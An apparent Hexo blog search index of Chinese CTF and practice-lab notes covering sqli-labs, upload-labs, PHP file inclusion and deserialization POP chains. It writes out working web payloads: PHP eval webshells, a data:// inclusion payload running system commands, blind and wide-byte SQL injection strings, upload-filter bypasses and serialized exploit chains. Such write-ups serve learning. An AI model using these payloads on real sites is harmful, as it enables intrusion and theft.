<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>emmmm</title>
    <url>/2022/10/03/hello-world/</url>
    <content><![CDATA[<h1 id="用hackbar解决include问题"><a href="#用hackbar解决include问题" class="headerlink" title="用hackbar解决include问题"></a>用hackbar解决include问题</h1><h2 id="安装hackbar"><a href="#安装hackbar" class="headerlink" title="安装hackbar"></a>安装hackbar</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装</span><br></pre></td></tr></table></figure>

<p><a href="https://codeload.github.com/HCTYMFF/hackbar2.1.3/zip/refs/heads/master">下载链接</a></p>
<p>1.记住文件目录</p>
<p>2.火狐打开扩展与插件，设置中使用从文件安装附加组件</p>
<p><strong>3.选择{4c98c9c7-fc13-4622-b08a-a18923469c1c}.xpi</strong></p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data:// 协议</span><br></pre></td></tr></table></figure>

<p> <a href="https://segmentfault.com/a/1190000018991087">Generating</a></p>
<p><img src="/2022/10/03/hello-world/ioi.jpg" alt="题图"></p>
<p>1.为了执行php代码，要使用data:&#x2F;&#x2F; 协议</p>
<p>2.由题可知使用的是post请求头，为执行则选择打开postdata</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.因为题目中参数是a,执行a=data://text/plain,&lt;?php  @eval($_POST[&#x27;1&#x27;]);?&gt;&amp;1=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得flag</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/03/hello-world/fgh.jpg" alt="题图"></p>
]]></content>
  </entry>
  <entry>
    <title>解决baby-rce</title>
    <url>/2022/10/04/baby-rce/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一步</span><br></pre></td></tr></table></figure>

<p>1.因为是post请求头，打开POST DATA，注意到参数值是game</p>
<p>2.输入system命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">game=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<p>获得flag</p>
<p><img src="/2022/10/04/baby-rce/uuy.jpg" alt="结果图"></p>
]]></content>
  </entry>
  <entry>
    <title>解决baby-upload</title>
    <url>/2022/10/04/baby-upload/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一步写一句话木马注入</span><br></pre></td></tr></table></figure>

<p>1.记事本<?php @eval($_POST['shell']);?></p>
<p>2.上传文件，注意修改后缀为.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第二步</span><br></pre></td></tr></table></figure>

<p>打开文件所在地址</p>
<p><img src="/2022/10/04/baby-upload/ggh.jpg" alt="进程图"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第三步</span><br></pre></td></tr></table></figure>

<p>使用system命令</p>
<p><img src="/2022/10/04/baby-upload/oopp.jpg" alt="结果"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/08/sql/</url>
    <content><![CDATA[<hr>
<h2 id="做题笔记"><a href="#做题笔记" class="headerlink" title="做题笔记"></a>做题笔记</h2><p>sqlilabs13<br>以admin admin<br>借用登录<br>uname&#x3D;admin’) order by 2#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit<br>如果#前句子进行完则继续进行后面的语句<br>以为没有回显示根据logoin是否成功猜测正确性<br>脚本写不了，因为显示的是图片<br>sqlilabs Less-17<br>username处有过滤。无法使用<br>使用password处驻点<br>sqlilabsLess-18</p>
<p>一.基于错误数值的方法<br>1.先输入正确的查询                                     布尔型盲注、报错型注入<br>找出有几列<br>2.测试如何结束select语句<br>3.使用工具，第一个为列<br>二.时间延迟型盲注<br>?id&#x3D;1’ and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;’r’ ,sleep(5),1)–+<br>寻找数据库名称长度<br>and if(length(database())&#x3D;8,sleep(5),1) –+<br>二分法寻找数据库名<br>and if(ascii(substr(database(),第几位,1))&gt;码,sleep(5),1) –+<br>寻求有几个tables<br>and if((select count(table_name) from information_schema.tables<br> where table_schema&#x3D;database(),1)&#x3D;4,sleep(10),1) –+<br>测试tables<br>and if(left((select table_name from information_schema.tables where table))<br>ru<br>select语句永远在括号里<br>确定名称用二分法   二分法求database<br>count数数<br>解题<br>1.四个表<br>2.<a href="http://localhost/sqlilabs/Less-5/?id=1&#39;">http://localhost/sqlilabs/Less-5/?id=1&#39;</a> and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1))&#x3D;8,sleep(5),1) –+<br>ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()<br>limit 从零开始为表名称，1开始为个数),1开始为第几个字母，1开始为字母个数))二分法 –+</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/12/sqlilabs%E7%AC%AC28%E5%85%B3/</url>
    <content><![CDATA[<p>测试语句union select 1,2,3</p>
<p>查表union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();%00</p>
<p>sqlilabs第28关</p>
<p>闭合方式为’)</p>
<p>过滤了注释符，用;%00代替</p>
<p>过滤了union select使用union all select</p>
<p>sqlilabs第32关 宽字符注入</p>
<p>观察得到过滤了grep_quote以及它没包括的&#x2F;,过滤了’以及”</p>
<p>观察得到SET NAMES gbk，转义编码\为5c,使用一个其他编码使其成为一个汉字，例如%df</p>
<p>绕过成功</p>
<p>sqlilabs第三十六关</p>
<p>观察得到SET NAMES gbk，</p>
<p>使用的是mysql_real_escape_string</p>
<p>插入转移符号\x00,\n,\r,\ ‘,\ “,\x1a;</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/15/sjk/</url>
    <content><![CDATA[<p>upload labs第二关卡</p>
<p>MIME检测</p>
<table>
<thead>
<tr>
<th>.js</th>
<th>application&#x2F;x-javascript</th>
</tr>
</thead>
<tbody><tr>
<td>.html</td>
<td>text&#x2F;html</td>
</tr>
<tr>
<td>.jpg</td>
<td>image&#x2F;jpeg</td>
</tr>
<tr>
<td>.pdf</td>
<td>application&#x2F;pdf</td>
</tr>
<tr>
<td>.png</td>
<td>image&#x2F;png</td>
</tr>
</tbody></table>
<p>isset()检测变量是否被设置</p>
<p>返回’ture’ 抑或是’false’</p>
<p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p>
<p>结果为ture 才会运行</p>
<p>观察得到是MIME检测，修改content type为image&#x2F;jpeg</p>
<p><strong>然后上传</strong></p>
<p>使用蚂蚁链接</p>
<p>forward之后 用浏览器打开地址连接蚂蚁</p>
<p>upload labs第三关卡</p>
<p>函数一trim(“”,)</p>
<p>过滤文件名，且含有把文件名转化为小写的代码</p>
<p>修改文件后缀为phptml上传成功</p>
<p>upload labs第四关卡</p>
<p>有点问题</p>
<p>upload labs第五关卡</p>
<p>upload labs第六关卡</p>
<p>upload labs第七关卡</p>
<p>根据windows自动去掉后缀名之后的.的特性</p>
<p>使用burp抓包</p>
<p>把ghjk.php改为ghjk.php.</p>
<p>发送，完成</p>
<p><img src="/2022/11/15/sjk/sjk%5Cghj.jpg" alt="ghj"></p>
]]></content>
  </entry>
  <entry>
    <title>jk</title>
    <url>/2022/11/15/jk/</url>
    <content><![CDATA[<p>upload labs第二关卡</p>
<p>MIME检测</p>
<table>
<thead>
<tr>
<th>.js</th>
<th>application&#x2F;x-javascript</th>
</tr>
</thead>
<tbody><tr>
<td>.html</td>
<td>text&#x2F;html</td>
</tr>
<tr>
<td>.jpg</td>
<td>image&#x2F;jpeg</td>
</tr>
<tr>
<td>.pdf</td>
<td>application&#x2F;pdf</td>
</tr>
<tr>
<td>.png</td>
<td>image&#x2F;png</td>
</tr>
</tbody></table>
<p>isset()检测变量是否被设置</p>
<p>返回’ture’ 抑或是’false’</p>
<p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p>
<p>结果为ture 才会运行</p>
<p>观察得到是MIME检测，修改content type为image&#x2F;jpeg</p>
<p><strong>然后上传</strong></p>
<p>使用蚂蚁链接</p>
<p>forward之后 用浏览器打开地址连接蚂蚁</p>
<p>upload labs第三关卡</p>
<p>函数一trim(“”,)</p>
<p>过滤文件名，且含有把文件名转化为小写的代码</p>
<p>修改文件后缀为phptml上传成功</p>
<p>upload labs第四关卡</p>
<p>有点问题</p>
<p>upload labs第五关卡</p>
<p>upload labs第六关卡</p>
<p>upload labs第七关卡</p>
<p>根据windows自动去掉后缀名之后的.的特性</p>
<p>使用burp抓包</p>
<p>把ghjk.php改为ghjk.php.</p>
<p>发送，完成</p>
<p><img src="/2022/11/15/jk/ghj.jpg" alt="题图"></p>
<p>upload labs 第8关卡</p>
<p>upload labs 第9关卡</p>
<p>观察源码会先去掉  .  然后再去掉::$DATA</p>
<p>则可以使用php.::$DATA.,借用Windows自动去掉点的特性上传文件</p>
<p>upload labs 第10关卡</p>
]]></content>
  </entry>
  <entry>
    <title>include做题笔记</title>
    <url>/2022/11/19/jilu%EF%BC%9B/</url>
    <content><![CDATA[<h1 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day?"></a>Had a bad day?</h1><ol>
<li></li>
</ol>
<p><img src="/2022/11/19/jilu%EF%BC%9B/fg.jpg" alt="题图"></p>
<p>观察可知为sql注入或者是文件包含</p>
<ol start="2">
<li></li>
</ol>
<p>获取源代码,使用php:&#x2F;&#x2F;filter伪协议</p>
<p>category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<p>发现报错，可知多了.php</p>
<p>去掉.php后发现正常出现源代码</p>
<ol start="3">
<li></li>
</ol>
<p>解码</p>
<?php
                $file = $_GET['category'];

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table>

4.

无意间使用flag发现include构造，应该符合if（....）条件



php://伪协议可以套一层协议



套一个字符index符合条件并且传入flag，读取flag.php



php://filter/convert.base64-encode/index/resource=flag



解码，得到flag

[探索php://filter在实战当中的奇技淫巧 - linuxsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/linuxsec/articles/12684259.html#:~:text=php%3A%2F%2Ffi,”来处理其他流。)
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/19/11.21%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>记得upload</p>
<p>[FireshellCTF2020]Caas<br>1<br>1.<br>观察到是C语言编译器<br>2.<br>有会先回显，利用起来<br>3.<br>利用报错<br>4.<br>猜测flag以文件的格式保存<br>5.<br>使用#include “&#x2F;flag”</p>
<h1 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a><strong>绕过__wakeup()</strong></h1><p>令对象属性个数的值大于本身的个数的真实值</p>
<h1 id="例题：bugku-flag-php"><a href="#例题：bugku-flag-php" class="headerlink" title="例题：bugku-flag.php"></a>例题：bugku-flag.php</h1><h1 id="例题：bugku-welcome-to-bugkuctf"><a href="#例题：bugku-welcome-to-bugkuctf" class="headerlink" title="例题：bugku-welcome to bugkuctf"></a>例题：bugku-welcome to bugkuctf</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不能现在就给你flag哦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我们注意到使用了 unserialize() 函数，这时候考虑使用 PHP 反序列化。源码通过 preg_match() 匹配了  flag 关键字，也是说无法在 index.php 中输出 flag.php 的内容。这里的关键在于 hint.php 中的 Flag  类，类中定义的 tostring() 方法会输出文件的内容。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copy Highlighter-hljs<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源代码如上</p>
<p>1.preg_match()可以匹配表达式，所以不可以直接用&#x2F;flag&#x2F;</p>
<p>2.后面是包含$file，输出$password</p>
<p>联系这两个</p>
<p>因为是反解$password</p>
<p>所以使用password</p>
<p>可以借助给$file赋值来输出flag.php</p>
<?php

Class Flag

{

public $file='flag.php';

}

$a=new Flag();

print(serialize($a));

?>

<p>?password&#x3D;</p>
<p>完成了就</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/19/include%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>1.<a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
<p>原理</p>
<p>在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。</p>
<ol start="2">
<li></li>
</ol>
<p>include() # 当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含 进来，发生错误时之给出一个警告，继续向下执行。</p>
<p>require() # require()与include()的区别在于require()执行如果发生错误，函数会输出 错误信息，并终止脚本的运行。</p>
<p><strong>包含函数</strong></p>
<p>PHP常见的导致文件包含的函数如下：**include()，include_once()，require()，require_once()**，fopen()，readfile() 当使用前4个函数包含一个新的文件时，只要文件内容符合PHP语法规范，那么任何扩展名都可以被PHP解析。包含非PHP语法规范源文件时，将会暴露其源代码。</p>
<h3 id="伪协议利用"><a href="#伪协议利用" class="headerlink" title="伪协议利用"></a>伪协议利用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://</span><br><span class="line">http://</span><br><span class="line">php://</span><br></pre></td></tr></table></figure>

<h4 id="1、php-x2F-x2F-input"><a href="#1、php-x2F-x2F-input" class="headerlink" title="1、php:&#x2F;&#x2F;input"></a>1、php:&#x2F;&#x2F;input</h4><p>说明：用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。</p>
<p>配合fputs使用</p>
<p>fopen中</p>
<table>
<thead>
<tr>
<th><code>mode</code></th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>&#39;r&#39;</code></td>
<td>只读方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td><code>&#39;r+&#39;</code></td>
<td>读写方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td><code>&#39;w&#39;</code></td>
<td>写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td><code>&#39;w+&#39;</code></td>
<td>读写方式打开，否则行为同 <code>&#39;w&#39;</code>。</td>
</tr>
<tr>
<td><code>&#39;a&#39;</code></td>
<td>写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。在这种情况下，<a href="https://www.php.net/manual/zh/function.fseek.php">fseek()</a>            没有效果，写入总是追加。</td>
</tr>
<tr>
<td><code>&#39;a+&#39;</code></td>
<td>读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。在这种情况下，<a href="https://www.php.net/manual/zh/function.fseek.php">fseek()</a>            只相应读取位置，写入总是追加。</td>
</tr>
<tr>
<td><code>&#39;x&#39;</code></td>
<td>创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则            <strong>fopen()</strong> 调用失败并返回 **<code>false</code>**，并生成一条            <strong><code>E_WARNING</code></strong> 级别的错误信息。如果文件不存在则尝试创建之。这和给            底层的 <code>open(2)</code> 系统调用指定            &#96;O_EXCL</td>
</tr>
<tr>
<td><code>&#39;x+&#39;</code></td>
<td>创建并以读写方式打开，其他的行为和 <code>&#39;x&#39;</code> 一样。</td>
</tr>
<tr>
<td><code>&#39;c&#39;</code></td>
<td>Open the file for writing only. If the file does not exist, it is            created. If it exists, it is neither truncated (as opposed to            <code>&#39;w&#39;</code>), nor the call to this function fails (as is            the case with <code>&#39;x&#39;</code>). The file pointer is            positioned on the beginning of the file. This may be useful if it’s            desired to get an advisory lock (see <a href="https://www.php.net/manual/zh/function.flock.php">flock()</a>)            before attempting to modify the file, as using            <code>&#39;w&#39;</code> could truncate the file before the lock            was obtained (if truncation is desired,            <a href="https://www.php.net/manual/zh/function.ftruncate.php">ftruncate()</a> can be used after the lock is            requested).</td>
</tr>
<tr>
<td><code>&#39;c+&#39;</code></td>
<td>Open the file for reading and writing; otherwise it has the same            behavior as <code>&#39;c&#39;</code>.</td>
</tr>
<tr>
<td><code>&#39;e&#39;</code></td>
<td>Set close-on-exec flag on the opened file descriptor. Only            available in PHP compiled on POSIX.1-2008 conform systems.</td>
</tr>
</tbody></table>
<p>使用啊a，写入文件</p>
<p>使用w，可以创建一个不存在的文件</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/18/%E7%AC%AC%E5%85%AD%E5%91%A8/</url>
    <content><![CDATA[<p>upload labs </p>
<p>》》》十五关</p>
<p>1.exif_imagetype()函数    读取一个图像的第一个字节并检查其签名   签名恰当返回对应常量</p>
<ol start="2">
<li></li>
</ol>
<p>upload labs 第十六关</p>
<p>1.imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像</p>
<p>upload labs 第十七关</p>
<p>文件只能上传图片以及gif，上传php会被删除</p>
<p>》》设置php代码可以在fputs()写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fputs(file,string,length)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>file</em></td>
<td align="left">必需。规定要写入的打开文件。</td>
</tr>
<tr>
<td align="left"><em>string</em></td>
<td align="left">必需。规定要写入文件的字符串。</td>
</tr>
<tr>
<td align="left"><em>length</em></td>
<td align="left">可选。规定要写入的最大字节数。</td>
</tr>
</tbody></table>
<p>fopen多次打开文件（权限设为w，可读）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fopen(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>filename</em></td>
<td align="left">必需。规定要打开的文件或 URL。</td>
</tr>
<tr>
<td align="left"><em>mode</em></td>
<td align="left">必需。规定要求到该文件&#x2F;流的访问类型。可能的值见下表。</td>
</tr>
<tr>
<td align="left"><em>include_path</em></td>
<td align="left">可选。如果也需要在 include_path 中检索文件的话，可以将该参数设为 1 或 TRUE。</td>
</tr>
<tr>
<td align="left"><em>context</em></td>
<td align="left">可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。</td>
</tr>
</tbody></table>
<?php

fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
<p>?&gt;</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/11/19/dfdf/</url>
    <content><![CDATA[<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.unserialize时候应该先调用wakeup，为了不替换为index.php，则将$this-&gt;source变为类 $source&#x3D;new Show</p>
<p>2.new 之后可以调用__toString()，可以创建一个,利用construct初始化str来newTest</p>
<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct(){<br>   return $this-&gt;str&#x3D;new Test;<br>    }</p>
<p>}</p>
<ol start="3">
<li><p>因为$this-&gt;p &#x3D; array()，使用test 调用invoke</p>
</li>
<li><p>最后利用var 获得包含的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">   return $this-&gt;str=new Test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = new Modifier;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Show;</span><br><span class="line"></span><br><span class="line">$b=new Show;</span><br><span class="line"></span><br><span class="line">$b-&gt;source=$a;</span><br><span class="line"></span><br><span class="line">var_dump(urlencode(serialize($b)));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2022/11/19/dfdf/g.png" alt="结果图"></p>
<p><img src="/2022/11/19/dfdf/j.png" alt="结果图"></p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Ezpop</title>
    <url>/2022/11/25/ooop/</url>
    <content><![CDATA[<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

